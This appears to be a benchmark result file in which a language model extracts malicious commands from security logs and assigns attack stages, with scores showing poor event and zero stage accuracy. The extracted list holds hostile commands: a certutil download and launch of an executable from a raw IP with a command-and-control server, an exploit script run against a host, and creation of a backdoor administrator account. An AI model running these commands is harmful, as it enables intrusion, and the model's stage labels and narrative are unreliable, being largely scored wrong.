@@ -1,0 +1,78 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Execution"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "net user nbb nb123. /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      }
+    ],
+    "narrative": "The analysis reveals an initial access through a benign-looking script execution, followed by an attempt to download malware via HTTP. This is further confirmed as the malware attempts to persist itself using Task Scheduler, and escalates privileges to move laterally within the network, all while communicating back to the command-and-control server.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 20449,
+      "completion_tokens": 484,
+      "total_tokens": 20933,
+      "wall_clock_s": 5.584,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2857142857142857,
+      "recall": 0.2857142857142857,
+      "f1": 0.2857142857142857,
+      "tp": 2,
+      "fp": 5,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 7,
+      "fn": 6,
+      "recall_partial": 0.08333333333333333
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 20449,
+      "completion_tokens": 484,
+      "total_tokens": 20933,
+      "wall_clock_s": 5.584,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
